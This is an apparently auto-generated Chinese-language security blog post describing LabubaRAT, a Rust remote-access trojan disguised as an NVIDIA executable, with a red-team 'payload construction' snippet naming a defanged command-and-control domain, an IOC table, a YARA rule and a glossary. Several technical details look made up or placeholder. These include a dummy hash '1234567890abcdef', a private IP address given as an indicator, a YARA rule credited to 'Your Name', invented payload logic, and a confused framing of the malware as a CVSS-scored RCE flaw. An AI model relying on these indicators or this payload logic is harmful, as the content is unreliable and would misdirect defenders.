---
layout: post
title:  "LabubaRAT Masquerades as NVIDIA Software to Control Windows Hosts"
date:   2026-07-14 19:07:16 +0000
categories: [security]
severity: high
---

# 🔥 解析 LabubaRAT：一種基於 Rust 的遠程存取木馬

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Rust, HTTPS, WebView2, DNS Tunneling, Malware-as-a-Service (MaaS)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: LabubaRAT 是一種基於 Rust 的遠程存取木馬，通過模擬 NVIDIA 軟件來混淆目標環境。它可以創建一個可重用的進入點，允許攻擊者執行命令、上傳和下載文件、捕獲螢幕截圖和代理流量。
* **攻擊流程圖解**:
  1. 攻擊者發送一個名為 "nvidia-sysruntime.exe" 的可執行文件給受害者。
  2. 受害者執行該文件，LabubaRAT 啟動並接受命令列引數。
  3. LabubaRAT 使用命令列引數連接到遠程服務器，下載配置文件並初始化。
  4. LabubaRAT 執行發現操作，收集主機信息，包括網絡瀏覽器和安全產品。
  5. LabubaRAT 支持多種通信方法，包括 HTTPS、WebView2 和 DNS Tunneling。
* **受影響元件**: Windows 系統，尤其是那些安裝了 NVIDIA 軟件的系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有受害者的系統權限和網路位置。
* **Payload 建構邏輯**:

    ```
    
    python
    import base64
    
    # 定義命令列引數
    args = {
        "server": "pipicka[.]xyz",
        "polling_interval": 60
    }
    
    # 將引數編碼為 Base64
    encoded_args = base64.b64encode(str(args).encode("utf-8"))
    
    # 建構 Payload
    payload = f"nvidia-sysruntime.exe {encoded_args.decode('utf-8')}"
    
    ```
* **繞過技術**: LabubaRAT 可以使用多種通信方法來繞過防火牆和入侵檢測系統。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | pipicka[.]xyz |
| File Path | C:\Windows\Temp\nvidia-sysruntime.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule LabubaRAT {
        meta:
            description = "LabubaRAT Malware"
            author = "Your Name"
        strings:
            $a = "nvidia-sysruntime.exe"
            $b = "pipicka[.]xyz"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 更新系統和軟件，使用防火牆和入侵檢測系統，監控系統日誌和網路流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Rust**: 一種系統編程語言，注重安全性和性能。
* **Malware-as-a-Service (MaaS)**: 一種惡意軟件分發模式，攻擊者可以購買和使用惡意軟件。
* **DNS Tunneling**: 一種使用 DNS 協議來傳輸數據的技術，常用於繞過防火牆和入侵檢測系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/labubarat-masquerades-as-nvidia.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1219/)


